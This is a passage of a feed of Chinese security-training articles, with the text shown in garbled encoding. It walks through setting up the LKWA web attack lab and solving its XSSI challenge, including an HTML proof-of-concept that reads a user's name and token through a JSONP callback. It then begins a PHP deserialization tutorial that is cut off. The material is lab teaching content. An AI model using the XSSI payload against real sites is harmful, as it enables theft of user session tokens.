data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>äºŒå‘ç®”å®‰å…¨å­¦é™¢</author>
<guid isPermaLink="false">2020-01-14-102716285</guid>
<pubDate>Tue, 14 Jan 2020 00:00:00 +0800</pubDate>
</item>
<item>
<title>â€œé²œä¸ºäººçŸ¥â€çš„webæ”»å‡»é¶åœºï¼šLKWA</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-13-102536299.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/102536299&quot;&gt;åŸæ–‡&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-a5228b41200835be44afc1c60763dead_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;å°±åƒæ ‡é¢˜æ‰€è¯´ï¼Œè¿™æ˜¯ä¸€ä¸ªä¸åŒå¯»å¸¸çš„ web æ”»å‡»é¶åœºï¼ŒåŒ…å«äº† 8 ç§é²œä¸ºäººçŸ¥çš„ web æ”»å‡»æ–¹å¼ï¼Œå¸¸è§çš„ XSS æ¼æ´åœ¨è¿™é‡Œå°±æ²¡æœ‰äº†ã€‚&lt;/p&gt;&lt;p&gt;ä¾‹å¦‚è·¨ç«™ç‚¹è„šæœ¬åŒ…å«ï¼ˆXSSIï¼‰ï¼ŒPHP å¯¹è±¡æ³¨å…¥ï¼ˆç®€å•æ³¨å…¥ï¼Œcookieï¼Œå¯¹è±¡å¼•ç”¨ï¼‰ï¼ŒPHARååºåˆ—åŒ–ï¼ŒSSRF å’Œå˜é‡ variableã€‚&lt;/p&gt;&lt;h2&gt;LKWA&lt;/h2&gt;&lt;p&gt;é¡¹ç›®åœ°å€ï¼š&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/weev3/LKWA&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/weev3/LKWA&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-69cf6eb6947214f8578b9aaec94ca2c3_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1861&quot; data-rawheight=&quot;957&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1861&quot; data-original=&quot;https://pic4.zhimg.com/v2-69cf6eb6947214f8578b9aaec94ca2c3_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-69cf6eb6947214f8578b9aaec94ca2c3_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1861&quot; data-rawheight=&quot;957&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1861&quot; data-original=&quot;https://pic4.zhimg.com/v2-69cf6eb6947214f8578b9aaec94ca2c3_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-69cf6eb6947214f8578b9aaec94ca2c3_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;docker ä¸€é”®æ­å»º&lt;/h2&gt;&lt;p&gt;&lt;b&gt;ç¯å¢ƒ&lt;/b&gt;&lt;/p&gt;&lt;p&gt;win10&lt;/p&gt;&lt;p&gt;å…ˆä¸‹è½½é¡¹ç›®åˆ°æœ¬åœ°ï¼š&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/weev3/LKWA&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/weev3/LKWA&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;ä½¿ç”¨å®ƒè‡ªå¸¦çš„ docker-compose è¿›è¡Œæ„å»ºï¼ˆè·³è½¬åˆ°é¡¹ç›®ç›®å½•ä¸‹ï¼‰&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;docker-compose build&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-86aea0e128cfbe5a2b32a02a20dbd90a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1041&quot; data-rawheight=&quot;238&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1041&quot; data-original=&quot;https://pic3.zhimg.com/v2-86aea0e128cfbe5a2b32a02a20dbd90a_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-86aea0e128cfbe5a2b32a02a20dbd90a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1041&quot; data-rawheight=&quot;238&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1041&quot; data-original=&quot;https://pic3.zhimg.com/v2-86aea0e128cfbe5a2b32a02a20dbd90a_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-86aea0e128cfbe5a2b32a02a20dbd90a_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;ç„¶åå¼€å¯å®¹å™¨&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;docker-compose up -d&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è®¿é—® &lt;a href=&quot;https://link.zhihu.com/?target=http%3A//127.0.0.1%3A3000/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;http://127.0.0.1:3000&lt;/a&gt; å³å¯&lt;/p&gt;&lt;p&gt;&lt;b&gt;åˆ—è¡¨&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;ç›² RCE&lt;/li&gt;&lt;li&gt;XSSI&lt;/li&gt;&lt;li&gt;PHAR ååºåˆ—åŒ–&lt;/li&gt;&lt;li&gt;PHP å¯¹è±¡æ³¨å…¥&lt;/li&gt;&lt;li&gt;é€šè¿‡ Cookie çš„ PHP å¯¹è±¡æ³¨å…¥&lt;/li&gt;&lt;li&gt;PHPå¯¹è±¡æ³¨å…¥ï¼ˆå¯¹è±¡å‚è€ƒï¼‰&lt;/li&gt;&lt;li&gt;é€šè¿‡ Cookie çš„ PHP å¯¹è±¡æ³¨å…¥&lt;/li&gt;&lt;li&gt;SSRF&lt;/li&gt;&lt;li&gt;å˜é‡å˜é‡&lt;/li&gt;&lt;/ul&gt;&lt;blockquote&gt;åœ¨æµ‹è¯• PHAR ååºåˆ—åŒ–ä¹‹å‰ï¼Œæ‚¨éœ€è¦åœ¨ php.ini è®¾ç½®ä¸­å°† phar.readonly = On æ›´æ”¹ä¸º phar.readonly = Off &lt;/blockquote&gt;&lt;h2&gt;TEST-XSSI&lt;/h2&gt;&lt;p&gt;&lt;b&gt;ä»€ä¹ˆæ˜¯XSSIï¼š&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//stackoverflow.com/questions/8028511/what-is-cross-site-script-inclusion-xssi&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;stackoverflow.com/quest&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;ions/8028511/what-is-cross-site-script-inclusion-xssi&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt; &lt;/p&gt;&lt;p&gt;æµè§ˆå™¨å·²å®ç°äº† SOP ç­‰å®‰å…¨åŠŸèƒ½ï¼Œå¯é˜²æ­¢ä»ä¸€ä¸ªæ¥æºåŠ è½½çš„æ–‡æ¡£æˆ–è„šæœ¬å¦‚ä½•ä¸å¦ä¸€ä¸ªæ¥æºçš„èµ„æºè¿›è¡Œäº¤äº’ã€‚å®ƒæœ‰åŠ©äºéš”ç¦»æ½œåœ¨çš„æ¶æ„æ–‡æ¡£ï¼Œä»è€Œå‡å°‘å¯èƒ½çš„æ”»å‡»åª’ä»‹ã€‚&lt;/p&gt;&lt;p&gt;ä¾‹å¦‚ï¼Œç«™ç‚¹ A å®ç°çš„ example.js å’Œç«™ç‚¹ B å¸Œæœ›ä»ç«™ç‚¹ A è¯»å– example.jsã€‚è¿™å°†è¢« SOP é˜»æ­¢ã€‚ä½†æ˜¯ï¼Œå¦‚æœç«™ç‚¹ A ä½¿ç”¨ JSONPï¼Œåˆ™ç«™ç‚¹ B å¯ä»¥è¯»å–è¯¥ js æ–‡ä»¶ã€‚&lt;/p&gt;&lt;p&gt;&lt;b&gt;é¢˜è§£&lt;/b&gt;&lt;/p&gt;&lt;p&gt;è¿›å…¥é¢˜ç›®&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-aee84229c6c1aef2f0c43d296ed5868f_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;976&quot; data-rawheight=&quot;456&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;976&quot; data-original=&quot;https://pic4.zhimg.com/v2-aee84229c6c1aef2f0c43d296ed5868f_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-aee84229c6c1aef2f0c43d296ed5868f_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;976&quot; data-rawheight=&quot;456&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;976&quot; data-original=&quot;https://pic4.zhimg.com/v2-aee84229c6c1aef2f0c43d296ed5868f_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-aee84229c6c1aef2f0c43d296ed5868f_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;æç¤ºæäº¤ç”¨æˆ·å adminï¼Œå¯†ç  password&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-b92cf6a19c11576c48dc5e9fa946067e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;963&quot; data-rawheight=&quot;442&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;963&quot; data-original=&quot;https://pic3.zhimg.com/v2-b92cf6a19c11576c48dc5e9fa946067e_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-b92cf6a19c11576c48dc5e9fa946067e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;963&quot; data-rawheight=&quot;442&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;963&quot; data-original=&quot;https://pic3.zhimg.com/v2-b92cf6a19c11576c48dc5e9fa946067e_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-b92cf6a19c11576c48dc5e9fa946067e_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;ç›®æ ‡æ˜¯çªƒå–ç”¨æˆ·å’Œ Token&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f72412fb0c7a8eaeb07ed6759afb8ab2_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;949&quot; data-rawheight=&quot;196&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;949&quot; data-original=&quot;https://pic3.zhimg.com/v2-f72412fb0c7a8eaeb07ed6759afb8ab2_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f72412fb0c7a8eaeb07ed6759afb8ab2_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;949&quot; data-rawheight=&quot;196&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;949&quot; data-original=&quot;https://pic3.zhimg.com/v2-f72412fb0c7a8eaeb07ed6759afb8ab2_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-f72412fb0c7a8eaeb07ed6759afb8ab2_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;å°è¯•ç™»å½•åï¼Œè¿›å…¥ä¸€ä¸ªä¸ªäººä¿¡æ¯é¡µé¢&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-c409f811e33d4c521429e47dc73d0a28_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;974&quot; data-rawheight=&quot;286&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;974&quot; data-original=&quot;https://pic1.zhimg.com/v2-c409f811e33d4c521429e47dc73d0a28_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-c409f811e33d4c521429e47dc73d0a28_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;974&quot; data-rawheight=&quot;286&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;974&quot; data-original=&quot;https://pic1.zhimg.com/v2-c409f811e33d4c521429e47dc73d0a28_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-c409f811e33d4c521429e47dc73d0a28_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;æŸ¥çœ‹ jsï¼Œè§‚å¯Ÿåˆ°ç”¨æˆ·åå’Œ token æ˜¯ä½¿ç”¨ ajax æ£€ç´¢çš„&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-276feffba869988444866c20413aadd7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;973&quot; data-rawheight=&quot;378&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;973&quot; data-original=&quot;https://pic4.zhimg.com/v2-276feffba869988444866c20413aadd7_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-276feffba869988444866c20413aadd7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;973&quot; data-rawheight=&quot;378&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;973&quot; data-original=&quot;https://pic4.zhimg.com/v2-276feffba869988444866c20413aadd7_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-276feffba869988444866c20413aadd7_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;åˆ›å»ºä¸€ä¸ª api æ¥å£è·å–ä¿¡æ¯&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-d6868ed64c53f7c2ebc8fb0db9a4ab99_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1114&quot; data-rawheight=&quot;480&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1114&quot; data-original=&quot;https://pic2.zhimg.com/v2-d6868ed64c53f7c2ebc8fb0db9a4ab99_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-d6868ed64c53f7c2ebc8fb0db9a4ab99_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1114&quot; data-rawheight=&quot;480&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1114&quot; data-original=&quot;https://pic2.zhimg.com/v2-d6868ed64c53f7c2ebc8fb0db9a4ab99_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-d6868ed64c53f7c2ebc8fb0db9a4ab99_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;çªƒå–ç”¨æˆ·å’Œ token çš„POC&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;html&amp;gt;
  &amp;lt;head&amp;gt;
    &amp;lt;title&amp;gt;XSSI&amp;lt;/title&amp;gt;    
  &amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;script&amp;gt;
        function a(s)
        {
        alert(JSON.stringify(s));
        }
    &amp;lt;/script&amp;gt;
    &amp;lt;script src=&amp;#34;http://localhost:8081/LKWA/api/user?callback=a&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä½¿ç”¨&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;php -S localhost:9000&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-914857337cf49d491dbaf8b638c95de9_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;871&quot; data-rawheight=&quot;97&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;871&quot; data-original=&quot;https://pic2.zhimg.com/v2-914857337cf49d491dbaf8b638c95de9_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-914857337cf49d491dbaf8b638c95de9_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;871&quot; data-rawheight=&quot;97&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;871&quot; data-original=&quot;https://pic2.zhimg.com/v2-914857337cf49d491dbaf8b638c95de9_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-914857337cf49d491dbaf8b638c95de9_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;æµè§ˆç½‘å€ä¹‹åã€‚å°±å¯ä»¥è·å–ç”¨æˆ·åå’Œ token&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-57e7d932452fbd1a77d2e3422d1f168f_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;469&quot; data-rawheight=&quot;268&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;469&quot; data-original=&quot;https://pic4.zhimg.com/v2-57e7d932452fbd1a77d2e3422d1f168f_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-57e7d932452fbd1a77d2e3422d1f168f_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;469&quot; data-rawheight=&quot;268&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;469&quot; data-original=&quot;https://pic4.zhimg.com/v2-57e7d932452fbd1a77d2e3422d1f168f_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-57e7d932452fbd1a77d2e3422d1f168f_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;äºŒå‘ç®”å®‰å…¨&lt;/a&gt;çš„ç½‘ç»œå®‰å…¨æŠ€èƒ½åŒ…æ›´æ–°äº†ï¼CISP-PTE è®¤è¯æŠ€èƒ½åŒ…ï¼Œè®©ä½ å…è´¹ä½“éªŒ CISP-PTE è®¤è¯å†…å®¹ã€‚&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3058&quot; data-original=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3058&quot; data-original=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;æ›´å¤šæœ‰å…³æ¸—é€æµ‹è¯•çš„å†…å®¹è¯·å‰å¾€&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;äºŒå‘ç®”å®‰å…¨&lt;/a&gt;è¿›è¡Œå­¦ä¹ ï¼Œæœ€è¿‘æ¨å‡ºäº†â€œæŒ–æ´â€ç­ï¼Œæƒ³äº†è§£æ›´å¤šèµ„è®¯çš„ï¼Œå¯å’¨è¯¢å®¢æœå¾®ä¿¡ &lt;b&gt;twosecurity02&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot;/&gt;&lt;/figure&gt;</description>
<author>äºŒå‘ç®”å®‰å…¨å­¦é™¢</author>
<guid isPermaLink="false">2020-01-13-102536299</guid>
<pubDate>Mon, 13 Jan 2020 00:00:00 +0800</pubDate>
</item>
<item>
<title>ç†è§£PHPååºåˆ—åŒ–æ¼æ´</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-10-102166928.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/102166928&quot;&gt;åŸæ–‡&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;å¾ˆå¤šå°ç™½å¯èƒ½éƒ½ä¼šæœ‰è¿™æ ·çš„ç–‘æƒ‘ï¼ŒPHP æˆ‘çŸ¥é“ï¼Œåºåˆ—åŒ–æˆ‘ä¹ŸçŸ¥é“ï¼Œåˆåœ¨ä¸€èµ·çš„ PHP ååºåˆ—åŒ–å°±æä¸æ‡‚äº†ã€‚&lt;/p&gt;&lt;p&gt;ä»Šå¤©å°±æ¥ç ´è§£ PHP ååºåˆ—åŒ–æ¼æ´ä¹‹è°œã€‚&lt;/p&gt;&lt;h2&gt;PHPåºåˆ—åŒ–ä¸ååºåˆ—åŒ–&lt;/h2&gt;&lt;p&gt;é¦–å…ˆï¼Œæˆ‘ä»¬æ¥ç†è§£ï¼ŒPHP åºåˆ—åŒ–ä¸ PHP ååºåˆ—åŒ–è¿™ä¸¤ä¸ªåè¯ã€‚&lt;/p&gt;&lt;blockquote&gt;åºåˆ—åŒ–ï¼Œç”¨äºå­˜å‚¨æˆ–ä¼ é€’ PHP çš„å€¼çš„è¿‡ç¨‹ä¸­ï¼ŒåŒæ—¶ä¸ä¸¢å¤±å…¶ç±»å‹å’Œç»“æ„ã€‚&lt;/blockquote&gt;&lt;p&gt;&lt;b&gt;serialize()&lt;/b&gt;&lt;/p&gt;&lt;blockquote&gt;å‡½æ•°ç”¨äºåºåˆ—åŒ–å¯¹è±¡æˆ–æ•°ç»„ï¼Œå¹¶è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚&lt;/blockquote&gt;&lt;p&gt;ç®€å•æ¥è¯´ï¼Œåºåˆ—åŒ–å°±æ˜¯æŠŠä¸€æ°´æœæ•´é½çš„æ”¾åœ¨æœç›˜é‡Œï¼Œæ¯”å¦‚ï¼š&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?php
$sites = array(&amp;#39;a&amp;#39;, &amp;#39;bb&amp;#39;, &amp;#39;ccc&amp;#39;);
$serialized_data = serialize($sites);
echo  $serialized_data;
?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¾“å‡ºç»“æœä¸ºï¼š&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;a:3:{i:0;s:1:&amp;#34;a&amp;#34;;i:1;s:2:&amp;#34;bb&amp;#34;;i:2;s:3:&amp;#34;ccc&amp;#34;;}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;oè¡¨ç¤ºå¯¹è±¡ï¼Œaè¡¨ç¤ºæ•°ç»„ï¼Œsè¡¨ç¤ºå­—ç¬¦ï¼Œiè¡¨ç¤ºæ•°å­—&lt;/blockquote&gt;&lt;p&gt;æ„æ€å°±æ˜¯å¾€æœç›˜é‡Œé¢æ”¾äº†ä¸€ä¸ªè‹¹æœã€ä¸¤ä¸ªé¦™è•‰ã€ä¸‰ä¸ªæ¢¨ï¼Œæ€»å…± 3 ç±»ã€‚&lt;/p&gt;&lt;p&gt;æ”¾å…¥å¯¹è±¡ä¹Ÿæ˜¯ç±»ä¼¼çš„ã€‚&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?php
class name1 {
    var $test1;
    var $test2;
}
$test3 = new name1;
$test3-&amp;gt;test1 = &amp;#39;hi&amp;#39;;
$test3-&amp;gt;test2 = &amp;#39;fun&amp;#39;;
